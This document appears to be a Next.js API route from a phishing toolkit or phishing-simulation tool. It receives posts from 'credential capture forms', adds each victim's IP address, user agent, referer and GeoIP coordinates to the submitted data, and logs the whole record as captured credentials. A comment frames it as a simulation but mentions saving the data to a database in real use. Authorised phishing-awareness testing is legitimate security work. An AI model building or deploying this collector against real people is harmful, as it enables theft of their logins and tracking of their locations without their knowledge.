
import { NextRequest, NextResponse } from 'next/server';
import { getGeoIpInfo } from '@/services/ip-geo-service';

// This is the webhook that the generated credential capture forms will post to.
export async function POST(req: NextRequest) {
    try {
        const formData = await req.json();
        const ipAddress = req.ip || req.headers.get('x-forwarded-for') || 'Unknown';
        
        let geoInfo = null;
        if (ipAddress !== 'Unknown') {
            geoInfo = await getGeoIpInfo(ipAddress);
        }

        // Enhance the captured data with request information
        const capturedData = {
            ...formData,
            timestamp: new Date().toISOString(),
            ipAddress: ipAddress,
            userAgent: req.headers.get('user-agent'),
            source: req.headers.get('referer'),
            city: geoInfo?.status === 'success' ? geoInfo.city : 'N/A',
            country: geoInfo?.status === 'success' ? geoInfo.country : 'N/A',
            latitude: geoInfo?.status === 'success' ? geoInfo.lat : 'N/A',
            longitude: geoInfo?.status === 'success' ? geoInfo.lon : 'N/A',
        };

        // --- IMPORTANT ---
        // In a real-world scenario, you would save this `capturedData` to a secure database
        // or a log file. For this simulation, we will just log it to the server console.
        console.log('--- CREDENTIALS CAPTURED ---');
        console.log(JSON.stringify(capturedData, null, 2));
        console.log('----------------------------');

        // Respond with a success message (or a redirect if you configured one)
        return NextResponse.json({ success: true, message: 'Data captured' }, { status: 200 });

    } catch (error) {
        console.error('Error in capture webhook:', error);
        return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
    }
}
